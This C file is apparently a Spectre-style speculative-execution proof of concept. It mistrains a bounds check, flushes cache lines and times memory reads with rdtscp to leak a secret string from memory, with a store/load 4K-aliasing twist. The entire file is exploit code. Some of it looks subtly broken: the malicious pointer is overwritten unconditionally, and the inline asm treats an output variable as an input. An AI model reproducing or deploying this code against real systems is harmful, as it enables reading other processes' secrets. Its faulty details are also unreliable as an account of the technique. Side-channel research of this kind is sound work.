/* Compile with "gcc -O0 -std=gnu99" */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
#define jump_size 512
#define four_k 4096
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16};
uint8_t unused2[64];
uint8_t array2[256 * jump_size];

char *secret = "The password is rootkea";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_func(int x, int value, int *stored_ptr, int *stored_ptr_mal)
{
  int loaded_value;
  // Store value to memory location
  __asm__ __volatile__(
      "movl %0, %%eax\n\t"
      "movl %%eax, (%1)\n\t"
      :
      : "r"(value), "r"(stored_ptr)
      : "%eax", "memory");
  if (x < array1_size)
  {
    // Load value from memory location + maybe 4K
    __asm__ __volatile__(
        "movl (%0), %%eax\n\t"
        "movl %%eax, %1\n\t"
        :
        : "r"(stored_ptr_mal), "r"(loaded_value)
        : "%eax", "memory");
    temp &= array2[array1[loaded_value] * jump_size];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t *addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--)
  {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush(&array2[i * jump_size]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--)
    {
      _mm_clflush(&array1_size);
      for (volatile int z = 0; z < 100; z++)
      {
      } /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      // Value to store
      int value;
      // The location to store is the address of the stored var
      int stored = 23;
      int *store_mal_ptr;
      if (x == malicious_x)
      {
        store_mal_ptr = (&stored) + four_k;
        value = 53;
      }
      else
      {
        store_mal_ptr = &stored;
        value = 13;
      }
      store_mal_ptr = &stored;
      
      /* Call the victim! */
      victim_func(x, value, &stored, store_mal_ptr);
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++)
    {
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[mix_i * jump_size];
      time1 = __rdtscp(&junk);         /* READ TIMER */
      junk = *addr;                    /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[13])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++)
    {
      if (j < 0 || results[i] >= results[j])
      {
        k = j;
        j = i;
      }
      else if (k < 0 || results[i] >= results[k])
      {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won't get optimized out */
  value[0] = (uint8_t)j;
  score[0] = results[j];
  value[1] = (uint8_t)k;
  score[1] = results[k];
}

int main(int argc,
         const char **argv)
{
  size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
  printf("First offset is %d\n", malicious_x);
  int i, score[2], len = 1;
  uint8_t value[2];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  printf("Reading %d bytes:\n", len);
  while (--len >= 0)
  {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=%c score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  return (0);
}
